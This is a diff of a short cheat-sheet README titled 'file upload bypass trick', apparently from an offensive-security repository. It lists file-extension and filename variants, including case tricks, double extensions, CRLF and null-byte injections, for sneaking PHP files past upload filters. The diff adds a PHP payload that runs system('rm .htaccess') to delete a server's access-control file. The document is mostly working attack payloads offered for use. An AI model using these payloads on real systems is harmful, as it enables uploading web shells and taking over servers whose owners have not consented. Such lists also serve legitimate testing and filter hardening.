@@ -1,7 +1,13 @@
-# file-upload-bypass
+<h1>
+  <samp>file upload bypass trick</samp>
+</h1>
 
 
-```console
+```diff
+-------------
+- with ext:
+-------------
+
 .php
 .PhTmL
 .php2
@@ -40,4 +46,14 @@ file.php%0d%0a.png
 file.phpJunk123png
 file.png.jpg.php
 file.php%00.png%00.jpg
+```
+
+```php
+-------------
+- by deleting .htaccess
+-------------
+
+<?php
+system("rm .htaccess")
+?>
 ```
